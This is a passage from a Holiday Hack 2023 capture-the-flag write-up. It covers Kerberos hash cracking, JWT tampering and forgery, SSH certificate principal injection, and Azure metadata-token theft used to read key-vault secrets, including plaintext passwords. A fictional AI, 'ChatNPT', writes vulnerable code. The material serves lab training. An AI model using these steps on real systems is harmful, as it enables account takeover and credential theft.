ursula.morris@geeseislands.com Legal Team Expansion Strategy Phishing michael.roberts@geeseislands.com Compliance Training Schedule Announcement Phishing alice.smith@geeseislands.com Summer Beach Cleanup Coordination Safe frank.harrison@geeseislands.com Annual Budget Review and Forecasting Safe xavier.edwards@geeseislands.com Year-End Sales Target Strategies Safe oliver.thomas@geeseislands.com New Research Project Kickoff Phishing teresa.green@geeseislands.com Financial Planning for 2024 Safe <p>Answer</p> <p></p>"},{"location":"objectives/o13_fn_phish/#response","title":"Response","text":"Fitzy Shortstack <p>You've cracked the case! Once again, you've proven yourself to be an invaluable asset in our fight against these digital foes.</p>"},{"location":"objectives/o14_mt_hash/","title":"Hashcat","text":"<p>Difficulty:  Direct link: Hashcat</p>"},{"location":"objectives/o14_mt_hash/#objective","title":"Objective","text":"<p>Request</p> <p>Eve Snowshoes is trying to recover a password. Head to the Island of Misfit Toys and take a crack at it!</p> Eve Snowshoes <p>Greetings, fellow adventurer! Welcome to Scaredy-Kite Heights, the trailhead of the trek through the mountains on the way to the wonderful Squarewheel Yard! I'm Eve Snowshoes, resident tech hobbyist, and I hear Alabaster is in quite the predicament. Our dear Alabaster forgot his password. He's been racking his jingle bells of memory with no luck. I've been trying to handle this password recovery thing parallel to this hashcat business myself but it seems like I am missing some tricks. So, what do you say, chief, ready to get your hands on some hashcat action and help a distraught elf out?</p> <pre><code>In a realm of bytes and digital cheer,  \nThe festive season brings a challenge near.  \nSanta's code has twists that may enthrall,  \nIt's up to you to decode them all.\n\nHidden deep in the snow is a kerberos token,  \nIts type and form, in whispers, spoken.  \nFrom reindeers' leaps to the elfish toast,  \nMight the secret be in an ASREP roast?\n\n`hashcat`, your reindeer, so spry and true,  \nWill leap through hashes, bringing answers to you.  \nBut heed this advice to temper your pace,  \n`-w 1 -u 1 --kernel-accel 1 --kernel-loops 1`, just in case.\n\nFor within this quest, speed isn't the key,  \nPatience and thought will set the answers free.  \nSo include these flags, let your command be slow,  \nAnd watch as the right solutions begin to show.\n\nFor hints on the hash, when you feel quite adrift,  \nThis festive link, your spirits, will lift:  \nhttps://hashcat.net/wiki/doku.php?id=example_hashes\n\nAnd when in doubt of `hashcat`'s might,  \nThe CLI docs will guide you right:  \nhttps://hashcat.net/wiki/doku.php?id=hashcat\n\nOnce you've cracked it, with joy and glee so raw,  \nRun /bin/runtoanswer, without a flaw.  \nSubmit the password for Alabaster Snowball,  \nOnly then can you claim the prize, the best of all.\n\nSo light up your terminal, with commands so grand,  \nCrack the code, with `hashcat` in hand!  \nMerry Cracking to each, by the pixelated moon's light,  \nMay your hashes be merry, and your codes so right!\n\n* Determine the hash type in hash.txt and perform a wordlist cracking attempt to find which password is correct and submit it to /bin/runtoanswer .*\n</code></pre>"},{"location":"objectives/o14_mt_hash/#solution","title":"Solution","text":"<p>We take a look at what we have in the directory:</p> <p><pre><code>elf@0af467fe3ca6:~$ ls\nHELP  hash.txt  password_list.txt\nelf@0af467fe3ca6:~$ cat hash.txt \n$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966\n</code></pre> Referencing https://hashcat.net/wiki/doku.php?id=example_hashes we see that the hash we have $krb5asrep$23$ matches the ID 18200, Kerberos 5, etype 23, AS-REP.</p> <p>We heed the warnings given us, and use the following command:</p> <p><pre><code>hashcat -a 0 -m 18200 -w 1 -u 1 --kernel-accel 1 --kernel-loops 1 hash.txt password_list.txt --force \n</code></pre> Reference https://hashcat.net/wiki/doku.php?id=hashcat for information on the options</p> <pre><code>$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966:IluvC4ndyC4nes!\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Type........: Kerberos 5 AS-REP etype 23\nHash.Target......: $krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2...dd1966\nTime.Started.....: Fri Jan  5 05:08:34 2024 (0 secs)\nTime.Estimated...: Fri Jan  5 05:08:34 2024 (0 secs)\nGuess.Base.......: File (password_list.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:      880 H/s (0.56ms) @ Accel:1 Loops:1 Thr:64 Vec:16\nRecovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts\nProgress.........: 144/144 (100.00%)\nRejected.........: 0/144 (0.00%)\nRestore.Point....: 0/144 (0.00%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-0\nCandidates.#1....: 1LuvCandyC4n3s!2022 -&gt; iLuvC4ndyC4n3s!23!\n\nStarted: Fri Jan  5 05:08:19 2024\nStopped: Fri Jan  5 05:08:35 2024\n</code></pre> <p>Answer</p> <p>IluvC4ndyC4nes! </p>"},{"location":"objectives/o14_mt_hash/#response","title":"Response","text":"<p>Eve Snowshoes</p> <p>Aha! Success! Alabaster will undoubtedly be grateful for our assistance. Onward to our next adventure, comrade! Feel free to explore this whimsical world of gears and steam!</p>"},{"location":"objectives/o15_pi_eh/","title":"Elf Hunt","text":"<p>Difficulty:  Direct link: Elf Hunt</p>"},{"location":"objectives/o15_pi_eh/#objective","title":"Objective","text":"<p>Request</p> <p>Piney Sappington needs a lesson in JSON web tokens. Hack Elf Hunt and score 75 points.</p> Piney Sappington <p>Hey there, friend! Piney Sappington here. You look like someone who's good with puzzles and games. I could really use your help with this Elf Hunt game I'm stuck on. I think it has something to do with manipulating JWTs, but I'm a bit lost. If you help me out, I might share some juicy secrets I've discovered. Let's just say things around here haven't been exactly... normal. So, what do ya say? Are you in? Oh, brilliant! I just know we'll crack this game together. I can't wait to see what we uncover, and remember, mum's the word! Thanks a bunch! Keep your eyes open and your ears to the ground.</p>"},{"location":"objectives/o15_pi_eh/#hints","title":"Hints","text":"JWT Secrets Revealed <p>Unlock the mysteries of JWTs with insights from PortSwigger's JWT Guide.</p> In Game <p>The elves are really fast aren't they. If there was only some way to slow them down. I wonder if they got into Santa's magic cookies?  From frozen screens to tropical dreams:</p>"},{"location":"objectives/o15_pi_eh/#solution","title":"Solution","text":"<p>Trying to hit these flying elves is not a simple feat.  Let's dive into how this game works. Looking at main.js we have a function to parse a jwt token.</p> <p><pre><code>function parseJwtPayload(token) {\n  // Split the JWT into its three parts\n  const parts = token.split('.');\n  // The payload is the second part. We decode it from base64 and parse the JSON\n  try {\n    const decodedPayload = atob(parts[1]);\n    const jsonObj = JSON.parse(decodedPayload);\n    return jsonObj;\n  } catch (e) {\n    console.error('Failed to parse JWT payload', e);\n    return null;\n  }\n}\n</code></pre> If we set some breakpoints, we can watch what's being parsed</p> <p></p> <p>Which then leads to the following setting the \"speed\" to the value grabbed from the JWT token.</p> <p><pre><code>var scoreText,\nscoreBox,\nelves,\nscore = 0,\nsessionKeyName = 'ElfHunt_JWT',\nsessionJWT = null;\ntry {\n  (sessionJWT = getDecodedJwtPayload(sessionKeyName)) &amp;&amp;\n  sessionJWT.hasOwnProperty('speed') &amp;&amp;\n  'number' == typeof sessionJWT.speed ||\n  clearCookiesAndReload()\n} catch (e) {\n  console.error('An error occurred:', e),\n  clearCookiesAndReload()\n}\nvar speed = sessionJWT.speed,\nnumberOfImages = 6,\nposterFlag = !1,\ncurrentPoster = void 0;\n</code></pre> Inspecting the JWT token, we have the following:</p> <p><pre><code>ElfHunt_JWT:\"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzcGVlZCI6LTUwMH0.\"\n</code></pre> JWT tokens are in three parts, with the first part being the header, second being the payload and third part being the signature. There is no signature in this JWT token, so we should be able to modify this and send our own values.</p> <p>Decoded JWT<pre><code>$ echo 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=' | base64 -d | jq\n{\n  \"alg\": \"none\",\n  \"typ\": \"JWT\"\n}\n$ echo 'eyJzcGVlZCI6LTUwMH0=' | base64 -d | jq\n{\n  \"speed\": -500\n}\n</code></pre> Let's change the value from \"-500\" to \"-100\"</p> <p><pre><code>$ echo '{\"speed\": -100}' | base64\neyJzcGVlZCI6IC0xMDB9Cg==\n</code></pre> I was able to use the Firefox developer tools, Storage &gt; Cookies, and modify the cookie value directly and then refresh the page.</p> <p></p> <p>Answer</p> <p></p>"},{"location":"objectives/o15_pi_eh/#response","title":"Response","text":"<p>Piney Sappington</p> <p>Well done! You've brilliantly won Elf Hunt! I couldn't be more thrilled. Keep up the fine work, my friend! What have you found there? The Captain's Journal? Yeah, he comes around a lot. You can find his comms office over at Brass Buoy Port on Steampunk Island.</p>"},{"location":"objectives/o16_pi_ssh/","title":"Certificate SSHenanigans","text":"<p>Difficulty:  Direct link: Create Cert</p>"},{"location":"objectives/o16_pi_ssh/#objective","title":"Objective","text":"<p>Request</p> <p>Go to Pixel Island and review Alabaster Snowball's new SSH certificate configuration and Azure Function App. What type of cookie cache is Alabaster planning to implement?</p> Alabaster Snowball <p>Hey there! I'm currently a bit swamped with this Azure deployment. Once I'm done I'll tell you about it. It's pretty awesome! You'll need a bit of Azure knowledge though. Sparkle Redberry can help you get up to speed on that. You can find her at the Rudolph's Rest Resort on Christmas Island.  Hello there! Alabaster Snowball at your service. I could use your help with my fancy new Azure server at ssh-server-vm.santaworkshopgeeseislands.org. ChatNPT suggested I upgrade the host to use SSH certificates, such a great idea! It even generated ready-to-deploy code for an Azure Function App so elves can request their own certificates. What a timesaver! I'm a little wary though. I'd appreciate it if you could take a peek and confirm everything's secure before I deploy this configuration to all the Geese Islands servers. Generate yourself a certificate and use the monitor account to access the host. See if you can grab my TODO list. If you haven't heard of SSH certificates, Thomas Bouve gave an introductory talk and demo on that topic recently. Oh, and if you need to peek at the Function App code, there's a handy Azure REST API endpoint which will give you details about how the Function App is deployed.</p>"},{"location":"objectives/o16_pi_ssh/#hints","title":"Hints","text":"Azure Function App Source Code <p>The get-source-control Azure REST API endpoint provides details about where an Azure Web App or Function App is deployed from.</p> SSH Certificates Talk <p>Check out Thomas Bouve's talk and demo to learn all about how you can upgrade your SSH server configuration to leverage SSH certificates.</p> Azure VM Access Token <p>Azure CLI tools aren't always available, but if you're on an Azure VM you can always use the Azure REST API instead.</p>"},{"location":"objectives/o16_pi_ssh/#solution","title":"Solution","text":"<p>Alabaster used ChatNPT for assistance in setting up SSH certificate authentication, and then deployed code to assist in generating those certificates. I wonder if Alabaster checked the code.</p> <p>We generate a key,</p> <pre><code>$ ssh-keygen -f ssh_key\nGenerating public/private rsa key pair.\nEnter passphrase (empty for no passphrase): \nEnter same passphrase again: \nYour identification has been saved in ssh_key\nYour public key has been saved in ssh_key.pub\nThe key fingerprint is:\nSHA256:7s5VX1ArODOmzzuDJ827hcAO++zy+lxmDMwenu3Z8KU mark@deepthought\nThe key's randomart image is:\n+---[RSA 3072]----+\n|                .|\n|            .  ..|\n|           * ... |\n|        + o + .. |\n|       .SO  .   .|\n|       .* X... . |\n|       ..==@ ... |\n|       +++=*B o  |\n|       oXBo*=E   |\n+----[SHA256]-----+\n</code></pre> <p>Paste ssh_key.pub to the Azure Function App and get back:</p> <p></p> <p>We save the ssh_cert value to a local file, ssh_key.crt, and then use that along with our private key to ssh into ssh-server-vm.santaworkshopgeeseislands.org as monitor</p> <pre><code>$ ssh-keygen -L -f ssh_key.crt \nssh_key.crt:\n        Type: ssh-rsa-cert-v01@openssh.com user certificate\n        Public key: RSA-CERT SHA256:7s5VX1ArODOmzzuDJ827hcAO++zy+lxmDMwenu3Z8KU\n        Signing CA: ED25519 SHA256:gvQLUkenLfTvsxJJzB8CpxgaA5lapSc9YEZZEnLudbk (using ssh-ed25519)\n        Key ID: \"902c7e39-280e-4926-8d4b-5f79e365bd38\"\n        Serial: 1\n        Valid: from 2024-01-05T19:29:55 to 2024-02-02T19:34:55\n        Principals: \n                elf\n        Critical Options: (none)\n        Extensions: \n                permit-pty\n\n$ ssh monitor@ssh-server-vm.santaworkshopgeeseislands.org -i ssh_key -i ssh_key.crt\n</code></pre> <p>Now that we are on an Azure VM, we can use the Azure REST API to generate a vm token to interact with the REST API.</p> <pre><code>accesstok=$(curl -G -H \"Metadata: true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/\" | jq '.access_token' | sed -r 's/\\\"//g')\n</code></pre> <p>And now that we have a vm accesstoken, we can proceed to List Subscriptions, Resource Groups, and knowing that the site is northpole-ssh-certs-fa, we can then check out Source Control</p> <pre><code>curl -X GET -H \"Authorization: Bearer $accesstok\" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01\n{\n  \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web\",\n  \"name\": \"northpole-ssh-certs-fa\",\n  \"type\": \"Microsoft.Web/sites/sourcecontrols\",\n  \"location\": \"East US\",\n  \"tags\": {\n    \"project\": \"northpole-ssh-certs\",\n    \"create-cert-func-url-path\": \"/api/create-cert?code=candy-cane-twirl\"\n  },\n  \"properties\": {\n    \"repoUrl\": \"https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa\",\n    \"branch\": \"main\",\n</code></pre> <p>Checking out the code repository, we see that they are using Python for the Azure Function App and looking closer at function_app.py </p> <p><pre><code>def parse_input(data) -&gt; Tuple[PublicKey, str]:\n    \"\"\"Parse and validate input parameters.\"\"\"\n    ssh_pub_key = data.get(\"ssh_pub_key\")\n #...\n    principal = data.get(\"principal\", DEFAULT_PRINCIPAL)\n #...\n</code></pre> It looks like they are checking and parsing principal in the POST JSON, and using DEFAULT_PRINCIPAL of elf. What if we are able to pass our own principal in what we send?</p> <p>If we watch the network traffic using the developer tools, we see a POST action to https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl</p> <p></p> <p>We only have the ssh_pub_key in the JSON payload, so what if we add principal to the payload and resend? But what principal should we use? Checking the /etc/ssh/ folder for config files, /etc/ssh/sshd_config.d/sshd_config_certs.conf shows</p> <p><pre><code>monitor@ssh-server-vm:~$ cat /etc/ssh/sshd_config.d/sshd_config_certs.conf \n# Set the host keys, certificates, and principals file\nHostKey /etc/ssh/ssh_host_rsa_key\nHostKey /etc/ssh/ssh_host_ed25519_key\nHostCertificate /etc/ssh/ssh_host_rsa_key-cert.pub\nHostCertificate /etc/ssh/ssh_host_ed25519_key-cert.pub\nTrustedUserCAKeys /etc/ssh/ca.pub\nAuthorizedPrincipalsFile /etc/ssh/auth_principals/%u\n...\nmonitor@ssh-server-vm:~$ ls /etc/ssh/auth_principals\nalabaster  monitor\nmonitor@ssh-server-vm:~$ cat /etc/ssh/auth_principals/alabaster \nadmin\n</code></pre> We use admin and get the following response</p> <p></p> <p>We save the ssh_cert to ssh_admin_key.crt and see if we can login as alabaster</p> <p><pre><code>$ ssh-keygen -L -f ssh_admin_key.crt \nssh_admin_key.crt:\n        Type: ssh-rsa-cert-v01@openssh.com user certificate\n        Public key: RSA-CERT SHA256:7s5VX1ArODOmzzuDJ827hcAO++zy+lxmDMwenu3Z8KU\n        Signing CA: ED25519 SHA256:gvQLUkenLfTvsxJJzB8CpxgaA5lapSc9YEZZEnLudbk (using ssh-ed25519)\n        Key ID: \"1ff552f2-01fe-411d-8549-04c38492e735\"\n        Serial: 1\n        Valid: from 2024-01-05T20:47:37 to 2024-02-02T20:52:37\n        Principals: \n                admin\n        Critical Options: (none)\n        Extensions: \n                permit-pty\n$ ssh alabaster@ssh-server-vm.santaworkshopgeeseislands.org -i ssh_key -i ssh_admin_key.crt \nalabaster@ssh-server-vm:~$ \n</code></pre> We are in, checking the home directory... <pre><code>alabaster@ssh-server-vm:~$ ls \nalabaster_todo.md  impacket\nalabaster@ssh-server-vm:~$ cat alabaster_todo.md \n# Geese Islands IT &amp; Security Todo List\n\n- [X] Sleigh GPS Upgrade: Integrate the new \"Island Hopper\" module into Santa's sleigh GPS. Ensure Rudolph's red nose doesn't interfere with the signal.\n- [X] Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.\n- [ ] Palm Tree Server Cooling: Make use of the island's natural shade. Relocate servers under palm trees for optimal cooling. Remember to watch out for falling coconuts!\n- [ ] Eggnog Firewall: Upgrade the North Pole's firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.\n- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!\n- [ ] Toy Workshop VPN: Establish a secure VPN tunnel back to the main toy workshop so the elves can securely access to the toy blueprints.\n- [ ] Festive 2FA: Roll out the new two-factor authentication system where the second factor is singing a Christmas carol. Jingle Bells is said to be the most secure.\nalabaster@ssh-server-vm:~$ \n</code></pre></p> <p>Answer</p> <p>Gingerbread Cookie Cache </p>"},{"location":"objectives/o16_pi_ssh/#response","title":"Response","text":"<p>Alabaster Snowball</p> <p>Oh my! I was so focused on the SSH configuration I completely missed the vulnerability in the Azure Function App. Why would ChatNPT generate code with such a glaring vulnerability? It's almost like it wanted my system to be unsafe. Could ChatNPT be evil? Thanks for the help, I'll go and update the application code immediately! While we're on the topic of certificates, did you know Active Directory (AD) uses them as well? Apparently the service used to manage them can have misconfigurations too. You might be wondering about that SatTrackr tool I've installed on the monitor account? Here's the thing, on my nightly stargazing adventures I started noticing the same satellite above Geese Islands. I wrote that satellite tracker tool to collect some additional data and sure enough, it's in a geostationary orbit above us. No idea what that means yet, but I'm keeping a close eye on that thing!</p>"},{"location":"objectives/o17_si_cc/","title":"The Captains Comms","text":"<p>Difficulty:  Direct link: Radio Hut</p>"},{"location":"objectives/o17_si_cc/#objective","title":"Objective","text":"<p>Request</p> <p>Speak with Chimney Scissorsticks on Steampunk Island about the interesting things the captain is hearing on his new Software Defined Radio. You'll need to assume the GeeseIslandsSuperChiefCommunicationsOfficer role.</p> Chimney Scissorsticks <p>Heya, think you could help Piney Sappington on Rainraster Cliffs on Pixel Island and then give me a hand?  Ahoy there, I'm Chimney Scissorsticks! You may have noticed some mischief-makers planning to stir up trouble ashore. They've made many radio broadcasts which the captain has been monitoring with his new software defined radio (SDR). The new SDR uses some fancy JWT technology to control access. The captain has a knack for shortening words, some sorta abbreviation trick. Not familiar with JWT values? No worries; just think of it as a clue-solving game. I've seen that the Captain likes to carry his journal with him wherever he goes. If only I could find the planned \"go-date\", \"go-time\", and radio frequency they plan to use. Remember, the captain's abbreviations are your guiding light through this mystery! Once we find a JWT value, these villains won't stand a chance. The closer we are, the sooner we'll be thwarting their pesky plans! We need to recreate an administrative JWT value to successfully transmit a message. Good luck, matey! I've no doubts about your cleverness in cracking this conundrum!</p>"},{"location":"objectives/o17_si_cc/#hints","title":"Hints","text":"Comms Abbreviations <p>I hear the Captain likes to abbreviate words in his filenames; shortening some words to just 1,2,3, or 4 letters.</p> Comms Web Interception Proxies <p>Web Interception proxies like Burp and Zap make web sites fun!</p> Comms Private Key <p>Find a private key, update an existing JWT!</p> Comms JWT Intro <p>A great introduction to JSON Web Tokens is available from Auth0.</p> Comms Journal <p>I've seen the Captain with his Journal visiting Pixel Island! </p>"},{"location":"objectives/o17_si_cc/#solution","title":"Solution","text":"<p>This section explains the different steps taken to solve the challenge. Try to find a good balance between providing sufficient detail and not overloading the reader with too much information. Use admonitions, images, diagrams, code blocks, and tables to highlight and structure important information or provide additional clarification.</p> <p></p> <p>We try to access the Captain's SDR, but we are told we need to be a radioMonitor. We try to access the Captain's Transmitter, and we are told we need to be a Radio Administrator.  We start reading through everything. The Instructions, Owner's Manual Vol 1, Vol 2, Vol 3, Owner's Card, Captain's To-Do List, and ChatNPT Output</p> <p>The Owner's Card tells us the default install directory is /jwtDefault, and radioMonitor is in that directory. If we go to https://captainscomms.com/jwtDefault/rMonitor.tok, we get a response of Invalid authorization token provided.</p> <p>Looking at the traffic, when we try to access the Captain's SDR, it makes a request to /checkRole, and that includes an Authorization Header. Let's edit that request and resend to request rMonitor.tok</p> <p></p> <p>Looking at the response, it's a JWT Token, and checking the Cookies, we see a justWatchThisRole cookie. </p> <p></p> <p>We replace the justWatchThisRole cookie with the rMonitor.tok token and that gives us access to the Captain's SDR.</p> <p></p> <p>Now that we have access to the SDR, when we try to listen to a frequency, we are told we need to be a radioDecoder. If the radioMonitor role was in /jwtDefault/rMonitor.tok, maybe radioDecoder is in /jwtDefault/rDecoder.tok. Using rMonitor's JWT token as Authorization Header, we are able to access the rDecoder.tok</p> <p></p> <p></p> <p> We take that and set the justWatchThis cookie, and now we are able to decode all of the radio signals We now have information concerning the private key The frequency we need to transmit on And the date and time, assuming the message there stands for 12/24 at 16:00 hours</p> <p></p> <p>The ChatNPT To-Do List mentions that the public key, capsPubKey.key is in a folder named keys in the same directory that rMonitor.tok is in, so /jwtDefault/keys/capsPubKey.key.</p> <p></p> <p>We now know the private key is in TH3CAPSPR1V4T3F0LD3R and as the Captain like to abbreviate, and the public key is named capsPubKey.key, going to guess that the filename is capsPrivKey.Key, so going to try /jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key, again using the rDecoder token in the Authorization header. Also, as the rMonitor token was needed to access rDecoder.tok, going to assume we will need to use rDecoder to access the the private key.</p> <p></p> <p>We now need an Administrator token. Looking at the radioDecoder JWT token, we see the payload looks like this:</p> <p><pre><code>{\n  \"iss\": \"HHC 2023 Captain's Comms\",\n  \"iat\": 1699485795.3403327,\n  \"exp\": 1809937395.3403327,\n  \"aud\": \"Holiday Hack 2023\",\n  \"role\": \"radioDecoder\"\n}\n</code></pre> From the Captain's Journal, we see that he was awared the role GeeseIslandsSuperChiefCommunicationsOfficer, so we need to create a token with that as the role. We setup python and install PyJWT, and run the following</p> <pre><code>import jwt\nfrom cryptography.hazmat.primitives import serialization\nprivate_key = open('/home/mark/HHC23/capcomm/capsPrivKey.key', 'r').read()\nkey = private_key.encode()\npayload = {\"iss\":\"HHC 2023 Captain's Comms\",\"iat\":1699485795.3403327,\"exp\":1809937395.3403327,\"aud\":\"Holiday Hack 2023\",\"role\":\"GeeseIslandsSuperChiefCommunicationsOfficer\"}\nnew_token = jwt.encode(\n payload=payload,\n key=key,\n algorithm='RS256'\n )\n new_token\n</code></pre> <p>We update the justWatchThisRole cookie with the newly generated token and...</p> <p></p> <p>We set the Frequency to 10426Hz, the Date to 1224, and as the original time was 1600, we change that to 1200, four hours earlier. </p> <p>Answer</p> <p></p>"},{"location":"objectives/o17_si_cc/#response","title":"Response","text":"<p>Chimney Scissorsticks</p> <p>Brilliant work! You've outsmarted those scoundrels with finesse!</p>"},{"location":"objectives/o18_si_ad/","title":"Active Directory","text":"<p>Difficulty: </p>"},{"location":"objectives/o18_si_ad/#objective","title":"Objective","text":"<p>Request</p> <p>Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the FileShare?</p> Ribb Bonbowford <p>Hi there, could you do me a quick favor? Can you go and check on Alabaster Snowball for me? He's at Rainraster Cliffs on Pixel Island. I heard some rumors he's been experimenting with ChatNPT again and I'm a little worried about what he's cooking up. Thank you so much! Please let me know what you find out.  Hello, I'm Ribb Bonbowford. Nice to meet you! Oh golly! It looks like Alabaster deployed some vulnerable Azure Function App Code he got from ChatNPT. Don't get me wrong, I'm all for testing new technologies. The problem is that Alabaster didn't review the generated code and used the Geese Islands Azure production environment for his testing. I'm worried because our Active Directory server is hosted there and Wombley Cube's research department uses one of its fileshares to store their sensitive files. I'd love for you to help with auditing our Azure and Active Directory configuration and ensure there's no way to access the research department's data. Since you have access to Alabaster's SSH account that means you're already in the Azure environment. Knowing Alabaster, there might even be some useful tools in place already.</p>"},{"location":"objectives/o18_si_ad/#hints","title":"Hints","text":"Useful Tools <p>It looks like Alabaster's SSH account has a couple of tools installed which might prove useful.</p> Misconfiguration ADventures <p>Certificates are everywhere. Did you know Active Directory (AD) uses certificates as well? Apparently the service used to manage them can have misconfigurations too.</p>"},{"location":"objectives/o18_si_ad/#solution","title":"Solution","text":"<p>This section explains the different steps taken to solve the challenge. Try to find a good balance between providing sufficient detail and not overloading the reader with too much information. Use admonitions, images, diagrams, code blocks, and tables to highlight and structure important information or provide additional clarification.</p> <p>Looks like we need to SSH back in to ssh-server-vm.santaworkshopgeeseislands.org as alabaster to help audit the environment. From the Reportinator we learned that a \"Vulnerable Active Directory Certificate Service-Certificate Template Allows Group/User Privilege Escalation\" and Certipy was used to validate that.</p> <p>In order to check that though, we need to find targets to run against. </p> <p>Looking at the system, we aren't seeing anything stick out as it pertains to domain memberships, file shares in use, etc. So looks like we are going to need to go back to the Azure REST API to see what we can glean.</p> <p>We get our access token and start back at what Subscriptions and Resource Groups we have access to</p> <p><pre><code>$ curl -X GET -H \"Authorization: Bearer $accesstok\" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/resources?api-version=2018-02-01 | jq\n\n{\n  \"value\": [\n    {\n      \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv\",\n      \"name\": \"northpole-ssh-certs-kv\",\n      \"type\": \"Microsoft.KeyVault/vaults\",\n      \"location\": \"eastus\",\n      \"tags\": {}\n    },\n    {\n      \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv\",\n      \"name\": \"northpole-it-kv\",\n      \"type\": \"Microsoft.KeyVault/vaults\",\n      \"location\": \"eastus\",\n      \"tags\": {}\n    }\n  ]\n}\n</code></pre> Looks like we have a couple of Key Vaults here. We check those out using the following commands:</p> <p><pre><code>curl -X GET -H \"Authorization: Bearer $accesstok\" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv?api-version=2023-07-01\n\ncurl -X GET -H \"Authorization: Bearer $accesstok\" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv?api-version=2023-07-01\n</code></pre> And we see \"vaultUri\":\"https://northpole-ssh-certs-kv.vault.azure.net/\" and \"vaultUri\":\"https://northpole-it-kv.vault.azure.net/\"</p> <p>So in order to interact with the Key Vaults to get Secrets and Keys we need to generate a new access token, but using https://vault.azure.net as the resource, otherwise we get the following error:</p> <p><pre><code>{\"error\":{\"code\":\"Unauthorized\",\"message\":\"AKV10022: Invalid audience. Expected https://vault.azure.net, found: https://management.azure.com/.\"}}\n</code></pre> So, we generate a new token), and work to interact with the key vaults. Trying to access /keys for both vaults returns errors, same for northpole-ssh-certs-kv.vault.azure.net/secrets, but ...</p> <p><pre><code>labaster@ssh-server-vm:~$ curl -X GET -H \"Authorization: Bearer $vault_tok\" https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4 | jq\n\n{\n  \"value\": [\n    {\n      \"id\": \"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript\",\n      \"attributes\": {\n        \"enabled\": true,\n        \"created\": 1699564823,\n        \"updated\": 1699564823,\n        \"recoveryLevel\": \"Recoverable+Purgeable\",\n        \"recoverableDays\": 90\n      },\n      \"tags\": {}\n    }\n  ],\n  \"nextLink\": null\n}\n\nalabaster@ssh-server-vm:~$ curl -X GET -H \"Authorization: Bearer $vault_tok\" https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.4 | jq\n\n{\n  \"value\": \"Import-Module ActiveDirectory; $UserName = \\\"elfy\\\"; $UserDomain = \\\"northpole.local\\\"; $UserUPN = \\\"$UserName@$UserDomain\\\"; $Password = ConvertTo-SecureString \\\"J4`ufC49/J4766\\\" -AsPlainText -Force; $DCIP = \\\"10.0.0.53\\\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \\\"\\\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru\",\n  \"id\": \"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d\",\n  \"attributes\": {\n    \"enabled\": true,\n    \"created\": 1699564823,\n    \"updated\": 1699564823,\n    \"recoveryLevel\": \"Recoverable+Purgeable\",\n    \"recoverableDays\": 90\n  },\n  \"tags\": {}\n}\n</code></pre> Not only do we now have 